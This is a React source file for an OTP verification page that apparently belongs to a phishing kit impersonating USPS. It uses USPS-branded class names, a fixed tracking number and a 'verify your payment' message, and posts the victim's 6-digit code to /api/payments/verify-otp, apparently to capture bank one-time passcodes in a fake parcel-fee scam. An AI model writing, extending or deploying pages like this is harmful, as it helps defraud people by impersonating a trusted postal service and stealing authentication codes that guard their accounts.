import React, { useState } from 'react';
import axios from 'axios';
import './OtpForm.css';
import FAQSection from './FAQSection';
import Footer from './Footer';
import ProgressBar from './ProgressBar';

const OtpForm = ({ formData, handleChange, setError }) => {
  const [loading, setLoading] = useState(false);
  const [otpError, setOtpError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setOtpError('');
    
    try {
      if (!formData.otp.match(/^\d{6}$/)) {
        throw new Error('OTP must be 6 digits');
      }
      
      const response = await axios.post('/api/payments/verify-otp', {
        otp: formData.otp
      });
      
      if (!response.data.success) {
        setOtpError(response.data.error || 'OTP is incorrect');
      }
    } catch (err) {
      setOtpError(err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="usps-payment-container">
      <ProgressBar currentStep="otp" />
      
      <div className="tracking-header">
        <h1>
          <span className="tracking-label">Tracking Number:</span> US9514901165421
        </h1>
      </div>

      <div className="status-notification">
        <div className="status-notification-text">
          <span className="status-notification-label">Status:</span>
          <span className="status-notification-message">OTP verification required</span>
        </div>
      </div>

      <div className="tracking-message">
        <p>We've sent a verification code to your registered mobile number. Please enter the 6-digit OTP to verify your payment.</p>
      </div>

      <form onSubmit={handleSubmit} className="payment-form">
        <h2 className="payment-header">OTP Verification</h2>
        
        <div className="form-group">
          <label>Enter OTP</label>
          <input
            type="text"
            name="otp"
            value={formData.otp}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              handleChange({ target: { name: e.target.name, value } });
            }}
            maxLength="6"
            placeholder="123456"
            required
            disabled={loading}
          />
        </div>
        
        {otpError && <div className="usps-error">{otpError}</div>}
        
        <div className="form-footer">
          <button 
            type="submit" 
            disabled={loading} 
            className="usps-button"
          >
            {loading ? (
              <>
                <span className="usps-spinner"></span> Verifying...
              </>
            ) : 'Verify OTP'}
          </button>
        </div>
      </form>
      <FAQSection/>
      <Footer/>
    </div>
  );
};

export default OtpForm;